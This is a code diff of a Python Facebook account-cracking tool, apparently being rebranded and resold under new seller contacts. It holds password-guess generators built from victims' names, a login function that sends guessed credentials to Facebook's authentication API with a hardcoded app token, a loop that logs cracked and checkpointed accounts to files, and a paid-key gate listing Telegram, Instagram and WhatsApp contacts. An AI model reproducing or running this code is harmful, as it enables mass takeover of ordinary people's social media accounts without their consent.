@@ -123,7 +123,7 @@ def clear():
 ### Logo
 def banner():
         os.system("clear")
-        os.system('echo "\n      ██ ▄█▀▄▄▄       ▄████▄   ██░ ██  ██▓\n      ██▄█▒▒████▄    ▒██▀ ▀█  ▓██░ ██▒▓██▒\n     ▓███▄░▒██  ▀█▄  ▒▓█    ▄ ▒██▀▀██░▒██▒\n     ▓██ █▄░██▄▄▄▄██ ▒▓▓▄ ▄██▒░▓█ ░██ ░██░\n     ▒██▒ █▄▓█   ▓██▒▒ ▓███▀ ░░▓█▒░██▓░██░\n     ▒ ▒▒ ▓▒▒▒   ▓▒█░░ ░▒ ▒  ░ ▒ ░░▒░▒░▓\n     ░ ░▒ ▒░ ▒   ▒▒ ░  ░  ▒    ▒ ░▒░ ░ ▒ ░\n     ░ ░░ ░  ░   ▒   ░         ░  ░░ ░ ▒ ░\n     ░  ░        ░  ░░ ░       ░  ░  ░ ░\n    ░  \n  \n         ╔═════════════════════════════╗\n         ║ TOOL NAME: { LIBYA -PRO }    ║\n         ║ AUTHOR   : Alzwage       ║\n         ║ GITHUB   : ahmedAlzwage      ║\n         ╚═════════════════════════════╝" | lolcat -a -d 2 -s 50')
+        os.system('echo "\n      ██ ▄█▀▄▄▄       ▄████▄   ██░ ██  ██▓\n      ██▄█▒▒████▄    ▒██▀ ▀█  ▓██░ ██▒▓██▒\n     ▓███▄░▒██  ▀█▄  ▒▓█    ▄ ▒██▀▀██░▒██▒\n     ▓██ █▄░██▄▄▄▄██ ▒▓▓▄ ▄██▒░▓█ ░██ ░██░\n     ▒██▒ █▄▓█   ▓██▒▒ ▓███▀ ░░▓█▒░██▓░██░\n     ▒ ▒▒ ▓▒▒▒   ▓▒█░░ ░▒ ▒  ░ ▒ ░░▒░▒░▓\n     ░ ░▒ ▒░ ▒   ▒▒ ░  ░  ▒    ▒ ░▒░ ░ ▒ ░\n     ░ ░░ ░  ░   ▒   ░         ░  ░░ ░ ▒ ░\n     ░  ░        ░  ░░ ░       ░  ░  ░ ░\n    ░  \n  \n         ╔═════════════════════════════╗\n         ║ TOOL NAME: { LIBYA-PRO }    ║\n         ║ AUTHOR   : ALZWAGE       ║\n         ║ GITHUB   : AhmedAlzwage        ║\n         ╚═════════════════════════════╝" | lolcat -a -d 2 -s 50')
         print("")
         
 def cek_dev():
@@ -897,7 +897,7 @@ def generate2(_cici_):
         else:
             i=i.lower()
             if len(i)==3 or len(i)==4 or len(i)==5:_azimvau_.append(i+"123");_azimvau_.append(i+"1234");_azimvau_.append(i+"12345")
-            else:_azimvau_.append(i);_azimvau_.append(i+"123");_azimvau_.append(i+"1234");_azimvau_.append(i+"12345");_azimvau_.append(i+"123456")
+            else:_azimvau_.append(i);_azimvau_.append(i+"12");_azimvau_.append(i+"123");_azimvau_.append(i+"1234");_azimvau_.append(i+"12345")
     _azimvau_.append(_cici_.lower());_azimvau_.append(_cici_.lower().split(" ")[0]+_cici_.lower().split(" ")[1])
     return _azimvau_
 
@@ -909,7 +909,7 @@ def generate3(_cici_):
             i=i.lower()
             if len(i)==3 or len(i)==4 or len(i)==5:_azimvau_.append(i+"123");_azimvau_.append(i+"1234");_azimvau_.append(i+"12345");_azimvau_.append(i+"@123")
             else:_azimvau_.append(i);_azimvau_.append(i+"1");_azimvau_.append(i+"12");_azimvau_.append(i+"123");_azimvau_.append(i+"1234");_azimvau_.append(i+"12345");_azimvau_.append(i.upper()+"123");_azimvau_.append(i+"@#");_azimvau_.append(i+"123@#")
-    _azimvau_.append(_cici_.lower());_azimvau_.append(_cici_.lower().split(" ")[0]+_cici_.lower().split(" ")[1]);_azimvau_.append(_cici_.lower().split(" ")[0]+_cici_.lower().split(" ")[1]+"12");_azimvau_.append(_cici_.lower().split(" ")[0]+_cici_.lower().split(" ")[1]+"123");_azimvau_.append("1020304050")
+    _azimvau_.append(_cici_.lower());_azimvau_.append(_cici_.lower().split(" ")[0]+_cici_.lower().split(" ")[1]);_azimvau_.append(_cici_.lower().split(" ")[0]+_cici_.lower().split(" ")[1]+"12");_azimvau_.append(_cici_.lower().split(" ")[0]+_cici_.lower().split(" ")[1]+"123");_azimvau_.append("889900")
     return _azimvau_
 
 
@@ -941,29 +941,10 @@ def tambah_pass_angka():
 def log_api_1(em,pas):
     ua = _azimvau_dapunta_('ugent.txt','r').read()
     r = requests.Session()
-    header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),
-        "x-fb-sim-hni": str(random.randint(20000, 40000)),
-        "x-fb-net-hni": str(random.randint(20000, 40000)),
-        "x-fb-connection-quality": "EXCELLENT",
-        "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
-        "user-agent": ua,
-        "content-type": "application/x-www-form-urlencoded",
-        "x-fb-http-engine": "Liger"}
-    param = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 
-        'format': 'json', 
-        'sdk_version': '2', 
-        'email': em, 
-        'locale': 'en_US', 
-        'password': pas, 
-        'sdk': 'ios', 
-        'generate_session_cookies': '1', 
-        'sig':'3f555f99fb61fcd7aa0c44f58f522ef6'}
-    api = 'https://b-api.facebook.com/method/auth.login'
-    response = r.get(api, params=param, headers=header)
-    if 'session_key' in response.text and 'EAAA' in response.text:
-        return {"status":"success","email":em,"pass":pas}
-    elif 'www.facebook.com' in response.json()['error_msg']:
-        return {"status":"cp","email":em,"pass":pas}
+    header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),"x-fb-sim-hni": str(random.randint(20000, 40000)),"x-fb-net-hni": str(random.randint(20000, 40000)),"x-fb-connection-quality": "EXCELLENT","x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA","user-agent": ua,"content-type": "application/x-www-form-urlencoded","x-fb-http-engine": "Liger"}
+    response = r.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + em + '&password=' + pas + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header)
+    if 'session_key' in response.text and 'EAAA' in response.text:return {"status":"ok","email":em,"pass":pas}
+    elif 'www.facebook.com' in response.json()['error_msg']:return {"status":"cp","email":em,"pass":pas}
     else:return {"status":"error","email":em,"pass":pas}
 def log_api_2(em,pas):
     ua = _azimvau_dapunta_('ugent.txt','r').read()
@@ -1278,18 +1259,18 @@ class crack:
                     else:
                         try:ke = _req_get_("https://graph.facebook.com/" + fl.get("id") + "?fields=name,id,birthday,first_name,middle_name,last_name,name_format,picture,short_name&access_token=" + _azimvau_dapunta_("token.txt","r").read());tt = _js_lo_(ke.text);ttl = tt["birthday"];m,d,y = ttl.split("/");m = bulan_ttl[m];ttll = (' • %s %s %s'%(d,m,y))
                         except:ttll = (''%())
-                        h_cp = "\r %s[%sLY-CP%s] %s • %s%s%s          "%(K,P,K,fl.get("id"),i,ttll,tahun(fl.get("id")));cek_opsi(fl.get("id"),i,h_cp)
+                        h_cp = "\r %s[%sMelanin-CP%s] %s • %s%s%s          "%(K,P,K,fl.get("id"),i,ttll,tahun(fl.get("id")));cek_opsi(fl.get("id"),i,h_cp)
                         self.cp.append("%s•%s"%(fl.get("id"),i));_azimvau_dapunta_(files_cp,"a+").write("%s•%s%s\n"%(fl.get("id"),i,ttll.replace(' ','')));break
                 elif log.get("status")=="ok":
                     files_ok = "OK/%s.txt"%(tanggal)
                     if fl.get("id") in files_ok:pass
                     else:
                         if 'methode_mbasic_v1' in metode or 'methode_mbasic_v2' in metode or 'methode_mobile_v1' in metode or 'methode_mobile_v2' in metode:h_ok = "\r %s[%sKachi-OK%s] %s • %s%s%s          "%(H,P,H,fl.get("id"),i,tahun(fl.get("id")),P);cek_apk(h_ok,cvt_cookies(log.get("cookies")))
-                        else:print("\r %s[%sLY-OK%s] %s • %s%s          "%(H,P,H,fl.get("id"),i,tahun(fl.get("id"))))
+                        else:print("\r %s[%sMelanin-OK%s] %s • %s%s          "%(H,P,H,fl.get("id"),i,tahun(fl.get("id"))))
                         self.ada.append("%s•%s"%(fl.get("id"),i));_azimvau_dapunta_(files_ok,"a+").write("%s•%s\n"%(fl.get("id"),i));break
                 else:continue
             self.ko+=1
-            print("\r %s[%sLibya%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(K,H,K,P,self.ko,len(self.fl),K,P,len(self.ada),K,P,len(self.cp),K,P), end='');sys.stdout.flush()
+            print("\r %s[%sCRACK%s][%s%s/%s%s][%sKachi-OK:%s%s][%sMelanin-CP:%s%s]%s"%(K,H,K,P,self.ko,len(self.fl),K,P,len(self.ada),K,P,len(self.cp),K,P), end='');sys.stdout.flush()
         except:self.start_crack(fl)
 
 
@@ -1421,11 +1402,11 @@ def genkey():
 		print("\n\033[0;91m           YOU ARE NOT PREMIUM USER ")
 		print("\033[0;91m        FIRST BUY PREMIUM KEY FROM OWNER")
 		print("\033[0;93m            SEND THIS KEY TO OWNER \n\n   YOUR KEY : \033[0;92m%s"%(rb))
-		print("\033[0;93m   TOOL PRICE : %s10$"%(H))
-		print("\033[0;93m   VALIDITY : %s1 year"%(H))
-		print("\033[0;94m          TELEGRAM ID : @FB_AZ")
-		print("\033[0;94m          INSTAGRAM : a_x_z1\n\n")
-		subprocess.check_output(["am", "start", "https://wa.me/+218921762446"])
+		print("\033[0;93m   TOOL PRICE : %s10K "%(H))
+		print("\033[0;93m   VALIDITY : %s1 month"%(H))
+		print("\033[0;94m          TELEGRAM ID : @Melanin023")
+		print("\033[0;94m          INSTAGRAM : @iam_melanin_\n\n")
+		subprocess.check_output(["am", "start", "https://wa.me/+2349150557103"])
 		exit()
 	except(IOError):
 		rb = rx
@@ -1436,11 +1417,11 @@ def genkey():
 		print("\n\033[0;91m              YOU ARE NOT PREMIUM USER ")
 		print("\033[0;91m           FIRST BUY PREMIUM KEY FROM OWNER")
 		print("\033[0;93m               SEND THIS KEY TO OWNER \n\n YOUR KEY : \033[0;92m%s%s"%(rb,basesplit))
-		print("\033[0;93m     TOOL PRICE : %s10$"%(H))
-		print("\033[0;93m     VALIDITY : %s1 year"%(H))
-		print("\033[0;94m             TELEGRAM ID : @FB_AZ")
-		print("\033[0;94m             INSTAGRAM : a_x_z1\n\n")
-		subprocess.check_output(["am", "start", "https://wa.me/+218921762445"])
+		print("\033[0;93m     TOOL PRICE : %s10K"%(H))
+		print("\033[0;93m     VALIDITY : %s1 month"%(H))
+		print("\033[0;94m             TELEGRAM ID : @iam_melanin_")
+		print("\033[0;94m             INSTAGRAM : @Melanin023\n\n")
+		subprocess.check_output(["am", "start", "https://wa.me/2349150557103"])
 		exit()
 
 def keycheck():
